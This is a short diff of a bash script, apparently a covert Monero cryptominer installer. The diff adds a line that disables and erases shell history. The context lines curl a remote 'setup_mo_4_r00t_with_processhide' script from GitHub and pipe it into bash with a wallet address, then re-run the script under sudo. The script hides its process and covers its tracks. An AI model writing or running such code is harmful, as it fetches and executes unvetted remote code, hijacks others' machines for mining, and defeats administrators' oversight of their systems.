@@ -1,4 +1,5 @@
 #!/bin/bash
+export HISTFILE=/dev/null ;history -d $(history 1)
 rootstuff(){
   curl  -s -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_mo_4_r00t_with_processhide.sh | bash -s 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX littlAcen@24-mail.com
   [ "$USER" != root ] && sudo -u "$USER" "$0"
